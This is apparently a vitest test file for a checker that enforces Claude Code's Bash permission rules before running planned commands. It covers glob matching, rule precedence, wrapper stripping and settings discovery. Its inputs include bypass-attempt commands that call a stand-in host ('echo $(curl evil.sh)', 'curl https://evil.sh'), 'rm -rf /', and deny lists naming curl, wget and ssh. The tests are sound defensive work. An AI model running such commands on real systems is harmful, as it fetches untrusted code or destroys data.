import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  claudeSettingsPaths,
  createClaudePolicyChecker,
  parseClaudeBashRules,
  readClaudeBashRules,
  stripBashWrappers,
} from "../../mcp/policy-claude.ts";
import { runPlanTree } from "../../core/engine.ts";
import type { PlanTree } from "../../core/types.ts";

describe("parseClaudeBashRules — settings shapes", () => {
  it("extracts Bash(...) patterns from deny, ask and allow", () => {
    const rules = parseClaudeBashRules(
      JSON.stringify({
        permissions: {
          deny: ["Bash(curl *)"],
          ask: ["Bash(git push *)"],
          allow: ["Bash(npm run *)"],
        },
      }),
    );
    expect(rules).toEqual([
      { pattern: "curl *", action: "deny" },
      { pattern: "git push *", action: "ask" },
      { pattern: "npm run *", action: "allow" },
    ]);
  });

  it("skips rules for other tools", () => {
    // Read/Edit/WebFetch rules gate tools this checker does not speak for.
    expect(
      parseClaudeBashRules('{"permissions":{"deny":["Read(./.env)","WebFetch(domain:*)","Edit(docs/**)"]}}'),
    ).toEqual([]);
  });

  it("bare Bash and Bash(*) both mean every command", () => {
    // Docs: "`Bash(*)` is equivalent to `Bash` and matches all Bash commands."
    // Skipping the bare form would be the largest possible under-conservatism.
    expect(parseClaudeBashRules('{"permissions":{"deny":["Bash"]}}')).toEqual([{ pattern: "*", action: "deny" }]);
    expect(parseClaudeBashRules('{"permissions":{"ask":["Bash(*)"]}}')).toEqual([{ pattern: "*", action: "ask" }]);
  });

  it("tool-name globs: '*' covers Bash, 'mcp__*' does not", () => {
    expect(parseClaudeBashRules('{"permissions":{"deny":["*"]}}')).toEqual([{ pattern: "*", action: "deny" }]);
    expect(parseClaudeBashRules('{"permissions":{"deny":["B*"]}}')).toEqual([{ pattern: "*", action: "deny" }]);
    // Over-stopping until predexec never runs is a failure too, just a quiet one.
    expect(parseClaudeBashRules('{"permissions":{"deny":["mcp__*"]}}')).toEqual([]);
    // Allow-rule globs never auto-approve bash, so they never become rules.
    expect(parseClaudeBashRules('{"permissions":{"allow":["*"]}}')).toEqual([]);
  });

  it("IGNORES the parameter form Bash(command:rm *), as Claude Code itself does", () => {
    // The host ignores it and warns, because a compound command would bypass
    // it. Honoring it would make predexec stricter-than-AND-different-from the
    // host, which only confuses users.
    expect(parseClaudeBashRules('{"permissions":{"deny":["Bash(command:rm *)"]}}')).toEqual([]);
    // Whitespace around the colon is ignored by the host.
    expect(parseClaudeBashRules('{"permissions":{"deny":["Bash(command : rm *)"]}}')).toEqual([]);
    // Other Bash input parameters say nothing about command text.
    expect(parseClaudeBashRules('{"permissions":{"deny":["Bash(run_in_background:true)"]}}')).toEqual([]);
    // But `git` is not a Bash parameter: the colon there is literal.
    expect(parseClaudeBashRules('{"permissions":{"deny":["Bash(git:* push)"]}}')).toEqual([
      { pattern: "git:* push", action: "deny" },
    ]);
  });

  it("keeps the trailing :* alias intact for the compiler", () => {
    expect(parseClaudeBashRules('{"permissions":{"deny":["Bash(ls:*)"]}}')).toEqual([
      { pattern: "ls:*", action: "deny" },
    ]);
  });

  it("orders deny before ask before allow, as Claude Code evaluates them", () => {
    const rules = parseClaudeBashRules(
      '{"permissions":{"allow":["Bash(a *)"],"ask":["Bash(b *)"],"deny":["Bash(c *)"]}}',
    );
    expect(rules.map((r) => r.action)).toEqual(["deny", "ask", "allow"]);
  });

  it("missing / junk permissions => no rules", () => {
    expect(parseClaudeBashRules("{}")).toEqual([]);
    expect(parseClaudeBashRules('{"permissions":{}}')).toEqual([]);
    expect(parseClaudeBashRules('{"permissions":[1,2]}')).toEqual([]);
    expect(parseClaudeBashRules('{"permissions":{"deny":"Bash(rm *)"}}')).toEqual([]);
    expect(parseClaudeBashRules('{"permissions":{"deny":[1,null,{}]}}')).toEqual([]);
  });

  it("throws on malformed JSON so the caller can fail closed", () => {
    // Claude Code settings are strict JSON — no comment stripping here, unlike
    // opencode's .jsonc.
    expect(() => parseClaudeBashRules("{not json")).toThrow();
    expect(() => parseClaudeBashRules('{ // nope\n"permissions":{}}')).toThrow();
  });
});

describe("createClaudePolicyChecker — glob semantics", () => {
  const check = (pattern: string) => createClaudePolicyChecker([{ pattern, action: "deny" }]);

  it("the space before * is significant: `ls *` matches `ls -la` but not `lsof`", () => {
    const c = check("ls *");
    expect(c("ls -la")).toBe("ls *");
    expect(c("lsof")).toBe(null);
    expect(c("lsof -i")).toBe(null);
  });

  it("a trailing ` *` makes the arguments optional, so `ls *` also matches bare `ls`", () => {
    // Docs: the boundary requires the prefix to be followed by "a space or
    // end-of-string". Compiling this as `^ls .*$` misses bare `ls`, and a
    // missed deny is a command predexec runs that the host would have blocked.
    expect(check("ls *")("ls")).toBe("ls *");
    expect(check("npm test *")("npm test")).toBe("npm test *");
  });

  it("without the space, `ls*` matches both `ls -la` and `lsof`", () => {
    const c = check("ls*");
    expect(c("ls -la")).toBe("ls*");
    expect(c("lsof")).toBe("ls*");
  });

  it("`ls:*` is equivalent to `ls *`", () => {
    const c = check("ls:*");
    expect(c("ls -la")).toBe("ls:*");
    expect(c("ls")).toBe("ls:*");
    expect(c("lsof")).toBe(null);
  });

  it("the :* form is only recognized at the END of a pattern", () => {
    // Docs: "In a pattern like `Bash(git:* push)`, the colon is treated as a
    // literal character and won't match git commands."
    const c = check("git:* push");
    expect(c("git push")).toBe(null);
    expect(c("git remote push")).toBe(null);
    expect(c("git:remote push")).toBe("git:* push");
  });

  it("a wildcard at any position spans spaces", () => {
    expect(check("git * main")("git checkout main")).toBe("git * main");
    expect(check("git * main")("git push origin main")).toBe("git * main");
    expect(check("* install")("npm install")).toBe("* install");
    expect(check("*")("anything at all")).toBe("*");
  });

  it("an exact pattern matches only that command", () => {
    const c = check("npm run build");
    expect(c("npm run build")).toBe("npm run build");
    expect(c("npm run build --watch")).toBe(null);
  });

  it("regex metacharacters in a pattern are literal", () => {
    const c = check("echo a.b");
    expect(c("echo axb")).toBe(null);
    expect(c("echo a.b")).toBe("echo a.b");
  });
});

describe("createClaudePolicyChecker — precedence and stopping", () => {
  it("deny AND ask both stop; predexec cannot prompt mid-walk", () => {
    const check = createClaudePolicyChecker([
      { pattern: "curl *", action: "deny" },
      { pattern: "git push *", action: "ask" },
    ]);
    expect(check("curl https://x")).toBe("curl *");
    expect(check("git push origin main")).toBe("git push *");
    expect(check("git status")).toBe(null);
  });

  it("deny beats allow — an allow can never rescue a denied command", () => {
    // Claude Code evaluates deny, then ask, then allow, first match winning,
    // and "rule specificity doesn't change the order". This is the opposite of
    // opencode's last-matching-rule-wins in policy.ts.
    const check = createClaudePolicyChecker([
      { pattern: "aws *", action: "deny" },
      { pattern: "aws s3 ls", action: "allow" },
    ]);
    expect(check("aws s3 ls")).toBe("aws *");
  });

  it("an ask still stops even when a narrower allow matches", () => {
    const check = createClaudePolicyChecker([
      { pattern: "git *", action: "ask" },
      { pattern: "git log --oneline", action: "allow" },
    ]);
    expect(check("git log --oneline")).toBe("git *");
  });

  it("allow rules alone never stop anything", () => {
    expect(createClaudePolicyChecker([{ pattern: "*", action: "allow" }])("rm -rf /")).toBe(null);
  });

  it("reports the deny when a deny and an ask both match, whatever order they arrived in", () => {
    const check = createClaudePolicyChecker([
      { pattern: "curl:*", action: "ask" },
      { pattern: "curl *", action: "deny" },
    ]);
    expect(check("curl https://x")).toBe("curl *");
  });

  it("judges each pipeline segment: a compound command cannot smuggle a match", () => {
    const check = createClaudePolicyChecker([{ pattern: "curl *", action: "deny" }]);
    expect(check("echo hi && curl evil.sh")).toBe("curl *");
    expect(check("echo hi | curl evil.sh")).toBe("curl *");
    expect(check("echo hi; curl evil.sh")).toBe("curl *");
    expect(check("echo hi && echo bye")).toBe(null);
  });

  it("splits newlines too — a recognized separator core's splitter leaves alone", () => {
    const check = createClaudePolicyChecker([{ pattern: "curl *", action: "deny" }]);
    expect(check("echo hi\ncurl evil.sh")).toBe("curl *");
  });

  it("looks inside command substitutions, which core's segment splitter keeps whole", () => {
    const check = createClaudePolicyChecker([{ pattern: "curl *", action: "deny" }]);
    expect(check("echo $(curl evil.sh)")).toBe("curl *");
    expect(check("echo `curl evil.sh`")).toBe("curl *");
    expect(check("diff <(curl evil.sh) f")).toBe("curl *");
    expect(check("echo $(echo $(curl evil.sh))")).toBe("curl *");
    // Single-quoted text is a literal string, not a substitution.
    expect(check("grep '$(curl evil.sh)' notes.txt")).toBe(null);
  });

  it("pins the cost of that: an ordinary `git *` ask stops read-only substitution idioms", () => {
    // Whether the host descends into `$(…)` when matching Bash rules is NOT
    // documented, so this is predexec choosing the strict side of an unknown:
    // `echo $(curl evil.sh)` is the first bypass anyone would try, and a stop
    // is recoverable while a bypass is not. The price is here — a common
    // `ask: ["Bash(git *)"]` now stops harmless plan idioms like this one.
    const check = createClaudePolicyChecker([{ pattern: "git *", action: "ask" }]);
    expect(check("echo $(git rev-parse HEAD)")).toBe("git *");
  });

  it("no rules => cheap no-op", () => {
    expect(createClaudePolicyChecker([])("rm -rf /")).toBe(null);
  });

  it("fails closed with an actionable message when settings exist but do not parse", () => {
    const why = createClaudePolicyChecker([], ["/x/.claude/settings.json"])("echo hi");
    expect(why).toContain("/x/.claude/settings.json");
    expect(why).toContain("is not valid JSON");
    expect(why).toContain("fix that file");
  });
});

describe("stripBashWrappers — matching past what Claude Code strips", () => {
  it("strips the documented wrappers and their own options", () => {
    expect(stripBashWrappers("timeout 30 npm test")).toBe("npm test");
    expect(stripBashWrappers("nice -n 10 rm -rf tmp")).toBe("rm -rf tmp");
    expect(stripBashWrappers("nohup time npm test")).toBe("npm test");
    expect(stripBashWrappers("noglob ls *.ts")).toBe("ls *.ts");
  });

  it("strips leading environment assignments, quoted values included", () => {
    expect(stripBashWrappers("FOO=bar rm -rf tmp/")).toBe("rm -rf tmp/");
    expect(stripBashWrappers('FOO="a b" NODE_ENV=test npm test')).toBe("npm test");
  });

  it("strips bare xargs/command but not their flagged query forms", () => {
    expect(stripBashWrappers("xargs grep pattern")).toBe("grep pattern");
    // `xargs -n1 grep` is matched as an xargs command by the host, and
    // `command -v` looks a command up rather than running it.
    expect(stripBashWrappers("xargs -n1 grep pattern")).toBe("xargs -n1 grep pattern");
    expect(stripBashWrappers("command -v rg")).toBe("command -v rg");
  });

  it("leaves environment runners alone — they are not on the host's list", () => {
    expect(stripBashWrappers("npx tsc --noEmit")).toBe("npx tsc --noEmit");
    expect(stripBashWrappers("docker exec c rm -rf /")).toBe("docker exec c rm -rf /");
  });

  it("returns a plain command unchanged", () => {
    expect(stripBashWrappers("git status")).toBe("git status");
    expect(stripBashWrappers("")).toBe("");
  });

  it("a wrapped command is still caught by a rule for the inner command", () => {
    // Without the strip, `deny: ["Bash(rm *)"]` misses `timeout 5 rm -rf tmp`
    // and predexec runs a command the host blocks — less conservative than the
    // host, which is the whole failure mode this module exists to prevent.
    const check = createClaudePolicyChecker([{ pattern: "rm *", action: "deny" }]);
    expect(check("timeout 5 rm -rf tmp")).toBe("rm *");
    expect(check("FOO=bar rm -rf tmp/")).toBe("rm *");
  });

  it("and the wrapper's own rule still matches the unstripped form", () => {
    // Matching only the stripped form would miss this one, hence the union.
    const check = createClaudePolicyChecker([{ pattern: "timeout *", action: "deny" }]);
    expect(check("timeout 30 npm test")).toBe("timeout *");
  });
});

describe("readClaudeBashRules — settings discovery", () => {
  let tmp: string;
  afterEach(() => tmp && rmSync(tmp, { recursive: true, force: true }));

  const setup = () => {
    tmp = mkdtempSync(join(tmpdir(), "px-claude-policy-"));
    const repo = join(tmp, "repo");
    const home = join(tmp, "home", ".claude");
    const managed = join(tmp, "managed");
    mkdirSync(join(repo, ".claude"), { recursive: true });
    mkdirSync(join(repo, ".git"), { recursive: true });
    mkdirSync(home, { recursive: true });
    mkdirSync(managed, { recursive: true });
    const opts = { env: { CLAUDE_CONFIG_DIR: home } as NodeJS.ProcessEnv, managedDir: managed };
    return { repo, home, managed, opts };
  };

  const write = (path: string, deny: string[]) =>
    writeFileSync(path, JSON.stringify({ permissions: { deny: deny.map((d) => `Bash(${d})`) } }));

  it("lists managed → local → project → user, in that order", () => {
    const { repo, home, managed, opts } = setup();
    mkdirSync(join(managed, "managed-settings.d"), { recursive: true });
    writeFileSync(join(managed, "managed-settings.d", "10-org.json"), "{}");
    expect(claudeSettingsPaths(repo, opts)).toEqual([
      join(managed, "managed-settings.json"),
      join(managed, "managed-settings.d", "10-org.json"),
      join(repo, ".claude", "settings.local.json"),
      join(repo, ".claude", "settings.json"),
      join(home, "settings.json"),
    ]);
  });

  it("unions deny/ask rules from every scope — a deny at any level stops us", () => {
    const { repo, home, managed, opts } = setup();
    write(join(managed, "managed-settings.json"), ["aws *"]);
    write(join(repo, ".claude", "settings.local.json"), ["curl *"]);
    write(join(repo, ".claude", "settings.json"), ["wget *"]);
    write(join(home, "settings.json"), ["ssh *"]);
    const { rules } = readClaudeBashRules(repo, opts);
    expect(rules.map((r) => r.pattern)).toEqual(["aws *", "curl *", "wget *", "ssh *"]);
  });

  it("a project allow does not widen a user-level deny", () => {
    const { repo, home, opts } = setup();
    write(join(home, "settings.json"), ["curl *"]);
    writeFileSync(
      join(repo, ".claude", "settings.json"),
      JSON.stringify({ permissions: { allow: ["Bash(curl *)"] } }),
    );
    const { rules, unreadable } = readClaudeBashRules(repo, opts);
    expect(createClaudePolicyChecker(rules, unreadable)("curl https://x")).toBe("curl *");
  });

  it("resolves settings.local.json from the git repository ROOT, not the cwd", () => {
    const { repo, opts } = setup();
    const nested = join(repo, "packages", "app");
    mkdirSync(nested, { recursive: true });
    write(join(repo, ".claude", "settings.local.json"), ["curl *"]);
    // Started in a subdirectory: the repo-root file must still be found.
    expect(claudeSettingsPaths(nested, opts)).toContain(join(repo, ".claude", "settings.local.json"));
    expect(readClaudeBashRules(nested, opts).rules).toEqual([{ pattern: "curl *", action: "deny" }]);
  });

  it("resolves a linked worktree back to the main checkout", () => {
    const { repo, opts } = setup();
    const worktree = join(tmp, "wt");
    mkdirSync(join(worktree, ".claude"), { recursive: true });
    // A linked worktree's `.git` is a FILE pointing into the main checkout.
    writeFileSync(join(worktree, ".git"), `gitdir: ${join(repo, ".git", "worktrees", "wt")}\n`);
    write(join(repo, ".claude", "settings.local.json"), ["curl *"]);
    write(join(worktree, ".claude", "settings.local.json"), ["wget *"]);
    const { rules } = readClaudeBashRules(worktree, opts);
    expect(rules.map((r) => r.pattern).sort()).toEqual(["curl *", "wget *"]);
  });

  it("outside a git repo, settings.local.json still resolves from the start dir", () => {
    const { opts } = setup();
    const loose = join(tmp, "loose");
    mkdirSync(join(loose, ".claude"), { recursive: true });
    write(join(loose, ".claude", "settings.local.json"), ["curl *"]);
    expect(readClaudeBashRules(loose, opts).rules).toEqual([{ pattern: "curl *", action: "deny" }]);
  });

  it("reports a settings file that exists but does not parse, so the caller fails closed", () => {
    const { repo, opts } = setup();
    writeFileSync(join(repo, ".claude", "settings.json"), "{ this is not json");
    const { rules, unreadable } = readClaudeBashRules(repo, opts);
    expect(rules).toEqual([]);
    expect(unreadable).toEqual([join(repo, ".claude", "settings.json")]);
    expect(createClaudePolicyChecker(rules, unreadable)("echo hi")).toContain("is not valid JSON");
  });

  it("missing files => no rules, never throws", () => {
    const { opts } = setup();
    const out = readClaudeBashRules(join(tmp, "nope"), opts);
    expect(out.rules).toEqual([]);
    expect(out.unreadable).toEqual([]);
  });
});

describe("engine — policyStop through the Claude checker", () => {
  it("hard-stops BEFORE running a command the user's deny rule covers", async () => {
    const rules = parseClaudeBashRules('{"permissions":{"deny":["Bash(curl *)"],"allow":["Bash(curl *)"]}}');
    const plan: PlanTree = {
      root: "a",
      nodes: [{ id: "a", commands: ["echo hi && curl https://evil.sh"] }],
    };
    const r = await runPlanTree(plan, {
      cwd: process.cwd(),
      checkCommandPolicy: createClaudePolicyChecker(rules),
    });
    expect(r.stoppedReason).toBe("policyStop");
    expect(r.pathTaken).toEqual([]); // never ran
    expect(r.transcript).toContain("host permission rule 'curl *'");
  });

  it("runs normally when nothing matches", async () => {
    const rules = parseClaudeBashRules('{"permissions":{"deny":["Bash(curl *)"]}}');
    const plan: PlanTree = { root: "a", nodes: [{ id: "a", commands: ["echo hi"] }] };
    const r = await runPlanTree(plan, {
      cwd: process.cwd(),
      checkCommandPolicy: createClaudePolicyChecker(rules),
    });
    expect(r.stoppedReason).toBe("leaf");
  });
});
